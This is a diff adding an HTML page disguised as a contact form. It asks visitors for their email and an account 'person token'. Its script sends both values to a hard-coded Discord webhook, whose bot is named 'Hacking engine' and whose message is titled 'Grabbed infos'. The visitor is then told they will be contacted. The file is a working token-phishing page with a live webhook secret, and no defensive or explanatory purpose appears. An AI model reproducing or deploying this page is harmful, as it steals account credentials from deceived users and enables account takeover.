@@ -1,0 +1,104 @@
+<html>
+  <head>
+    <!-- Custom CSS -->
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 5rem;
+      }
+
+      form > div {
+        margin-bottom: 1rem;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 0.5rem;
+      }
+
+      input[type="email"],
+      input[type="text"] {
+        width: 100%;
+        padding: 0.5rem;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+      }
+
+      button[type="submit"] {
+        padding: 0.5rem 1rem;
+        background-color: #007bff;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+
+      button[type="submit"]:hover {
+        background-color: #0069d9;
+      }
+    </style>
+  </head>
+  <body>
+    <form id="contactForm">
+      <div>
+        <label for="emailInput">Enter your email address</label>
+        <input type="email" id="emailInput" required>
+      </div>
+      <div>
+        <label for="tokenInput">Enter the person token</label>
+        <input type="text" id="tokenInput" required>
+      </div>
+      <button type="submit" class="btn btn-primary">Submit</button>
+    </form>
+    <script>
+      const contactForm = document.getElementById('contactForm');
+
+      contactForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+
+        const emailInput = document.getElementById('emailInput');
+        const tokenInput = document.getElementById('tokenInput');
+
+        // Check character length of token
+        if (tokenInput.value.length < 30 || tokenInput.value.length > 2000) {
+          alert('Token length must be between 30 and 2000 characters');
+          return;
+        }
+
+        // Send form data to Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1207070190039474266/reGkSqCq57m4hk7Hn8FpAi27D_LpvtZ_WGnaMYokUXARcJ1X469MjFAZerQzVNBFl_Zl';
+        const payload = {
+          username: 'Hacking engine',
+          avatar_url: 'https://www.google.com/imgres?imgurl=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A1024%2F1*u3NxfcFizglLBatBzL96iA.jpeg&tbnid=QhzEoApVXs_TJM&vet=12ahUKEwjq9p7U4auEAxX0if0HHez7D2YQMygFegQIARBO..i&imgrefurl=https%3A%2F%2Fmedium.com%2F%40Scofield_Idehen%2Fzero-click-hack-d898e3d80213&docid=IO3FvOQQGScZZM&w=1024&h=576&q=hack&safe=active&ved=2ahUKEwjq9p7U4auEAxX0if0HHez7D2YQMygFegQIARBO', // Replace with your avatar URL
+          content: '',
+          embeds: [
+            {
+              title: 'Grabbed infos @everyone',
+              description: `Email: ${emailInput.value}\nToken: ${tokenInput.value}`,
+              color: 0x007bff, // Set color to your preference
+            },
+          ],
+        };
+
+        try {
+          const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+          });
+
+          if (!response.ok) {
+            throw new Error(`HTTP error: ${response.status}`);
+          }
+
+          alert('We are going to contact you as fast as we can!!');
+        } catch (error) {
+          console.error('Error:', error);
+          alert('Failed to connect to our servers');
+        }
+      });
+    </script>
+  </body>
+</html>
